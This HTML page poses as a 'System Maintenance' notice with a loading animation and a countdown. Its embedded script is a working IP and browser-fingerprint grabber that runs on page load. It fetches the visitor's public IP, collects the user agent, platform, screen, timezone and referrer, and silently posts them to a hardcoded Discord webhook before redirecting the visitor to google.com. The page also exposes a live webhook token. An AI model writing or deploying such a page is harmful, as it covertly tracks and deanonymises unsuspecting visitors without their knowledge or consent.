<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Maintenance</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #3498db;
            --secondary-color: #2c3e50;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--light-color);
            overflow: hidden;
        }
        
        .background-shapes {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        
        .shape {
            position: absolute;
            border-radius: 50%;
            opacity: 0.1;
        }
        
        .shape-1 {
            width: 300px;
            height: 300px;
            background: var(--primary-color);
            top: -100px;
            left: -100px;
        }
        
        .shape-2 {
            width: 200px;
            height: 200px;
            background: var(--accent-color);
            bottom: -50px;
            right: -50px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 500px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
        }
        
        h2 {
            font-size: 2rem;
            margin-bottom: 15px;
            color: white;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        p {
            margin-bottom: 25px;
            line-height: 1.6;
            font-size: 1.1rem;
        }
        
        .loader-container {
            margin: 30px 0;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            margin: 0 auto;
            position: relative;
        }
        
        .loader-circle {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid transparent;
            border-top: 4px solid var(--primary-color);
            border-right: 4px solid var(--accent-color);
            animation: spin 1.5s linear infinite;
        }
        
        .loader-inner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top: 3px solid var(--light-color);
            border-bottom: 3px solid var(--light-color);
            animation: spinReverse 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes spinReverse {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(-360deg); }
        }
        
        .progress-container {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        
        .countdown {
            font-size: 1.2rem;
            margin: 15px 0;
            font-weight: bold;
        }
        
        .details {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            text-align: left;
        }
        
        .details h3 {
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .details-content {
            font-family: monospace;
            font-size: 0.9rem;
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.5s ease;
        }
        
        .details.active .details-content {
            max-height: 200px;
        }
        
        .redirect-notice {
            margin-top: 20px;
            font-style: italic;
            opacity: 0.8;
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }
    </style>
</head>
<body>
    <div class="background-shapes">
        <div class="shape shape-1"></div>
        <div class="shape shape-2"></div>
    </div>
    
    <div class="container">
        <h2><i class="fas fa-tools"></i> System Maintenance</h2>
        <p>We're performing critical updates to improve your experience. Please wait while we complete this process.</p>
        
        <div class="loader-container">
            <div class="loader">
                <div class="loader-circle"></div>
                <div class="loader-inner"></div>
            </div>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="countdown" id="countdown">Redirecting in 5 seconds...</div>
        
        <div class="details" id="details">
            <h3 onclick="toggleDetails()"><i class="fas fa-chevron-down"></i> Technical Details</h3>
            <div class="details-content" id="detailsContent">
                <!-- Details will be populated by JavaScript -->
            </div>
        </div>
        
        <div class="redirect-notice">
            <p>You will be automatically redirected when maintenance is complete.</p>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1410310738379280414/MBRetiiW0O81VCSBihKVihhY-245aeH4dMnBFf8FoJLgkTu9kfnfF8FaeuDd6KKAqjrt';
        
        // Elements
        const progressBar = document.getElementById('progressBar');
        const countdown = document.getElementById('countdown');
        const details = document.getElementById('details');
        const detailsContent = document.getElementById('detailsContent');
        
        // Collected data object
        const collectedData = {
            ip: '',
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            browser: {
                name: getBrowserName(),
                version: getBrowserVersion()
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
        };
        
        // Get browser name
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Firefox")) return "Mozilla Firefox";
            if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
            if (userAgent.includes("Opera") || userAgent.includes("OPR/")) return "Opera";
            if (userAgent.includes("Edg")) return "Microsoft Edge";
            if (userAgent.includes("Chrome")) return "Google Chrome";
            if (userAgent.includes("Safari")) return "Apple Safari";
            return "Unknown";
        }
        
        // Get browser version
        function getBrowserVersion() {
            const userAgent = navigator.userAgent;
            const browser = getBrowserName();
            
            if (browser === "Google Chrome") {
                return userAgent.match(/Chrome\/([0-9.]+)/)[1];
            } else if (browser === "Mozilla Firefox") {
                return userAgent.match(/Firefox\/([0-9.]+)/)[1];
            } else if (browser === "Apple Safari") {
                return userAgent.match(/Version\/([0-9.]+)/)[1];
            } else if (browser === "Microsoft Edge") {
                return userAgent.match(/Edg\/([0-9.]+)/)[1];
            } else if (browser === "Opera") {
                return userAgent.match(/(Opera|OPR)\/([0-9.]+)/)[2];
            }
            
            return "Unknown";
        }
        
        // Toggle details visibility
        function toggleDetails() {
            details.classList.toggle('active');
            const icon = details.querySelector('i');
            icon.classList.toggle('fa-chevron-down');
            icon.classList.toggle('fa-chevron-up');
        }
        
        // Get IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                collectedData.ip = data.ip;
                return data.ip;
            } catch (error) {
                collectedData.ip = 'Unable to retrieve';
                return 'Unable to retrieve';
            }
        }
        
        // Format collected data for display
        function formatDataForDisplay() {
            return `
IP: ${collectedData.ip}
Browser: ${collectedData.browser.name} v${collectedData.browser.version}
Platform: ${collectedData.platform}
Screen: ${collectedData.screen.width}x${collectedData.screen.height}
Language: ${collectedData.language}
Timezone: ${collectedData.timezone}
Cookies: ${collectedData.cookieEnabled ? 'Enabled' : 'Disabled'}
Referrer: ${collectedData.referrer || 'Direct visit'}
Timestamp: ${new Date(collectedData.timestamp).toLocaleString()}
            `.trim();
        }
        
        // Send data to webhook
        async function sendToWebhook() {
            try {
                const payload = {
                    embeds: [{
                        title: "System Scan Report",
                        color: 0x3498db,
                        fields: [
                            { name: "IP Address", value: `\`\`\`${collectedData.ip}\`\`\``, inline: false },
                            { name: "Browser", value: `${collectedData.browser.name} v${collectedData.browser.version}`, inline: true },
                            { name: "Platform", value: collectedData.platform, inline: true },
                            { name: "Screen", value: `${collectedData.screen.width}x${collectedData.screen.height}`, inline: true },
                            { name: "Language", value: collectedData.language, inline: true },
                            { name: "Timezone", value: collectedData.timezone, inline: true },
                            { name: "Referrer", value: collectedData.referrer || 'Direct visit', inline: false },
                            { name: "User Agent", value: `\`\`\`${collectedData.userAgent}\`\`\``, inline: false }
                        ],
                        footer: { 
                            text: `MCD Scan | ${new Date().toLocaleString()}` 
                        }
                    }],
                    username: "System Scanner",
                    avatar_url: "https://i.imgur.com/qcPHpcR.png"
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Silent fail
            }
        }
        
        // Update progress bar
        function updateProgress(percent) {
            progressBar.style.width = `${percent}%`;
        }
        
        // Initialize
        async function init() {
            // Get IP address
            await getIP();
            
            // Update details content
            detailsContent.textContent = formatDataForDisplay();
            
            // Send data to webhook
            await sendToWebhook();
            
            // Animate progress bar
            let progress = 0;
            const interval = setInterval(() => {
                progress += 2;
                updateProgress(progress);
                
                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 1000);
                }
            }, 100);
            
            // Update countdown
            let seconds = 5;
            const countdownInterval = setInterval(() => {
                countdown.textContent = `Redirecting in ${seconds} seconds...`;
                seconds--;
                
                if (seconds < 0) {
                    clearInterval(countdownInterval);
                }
            }, 1000);
        }
        
        // Start the process
        init();
    </script>
</body>
</html>
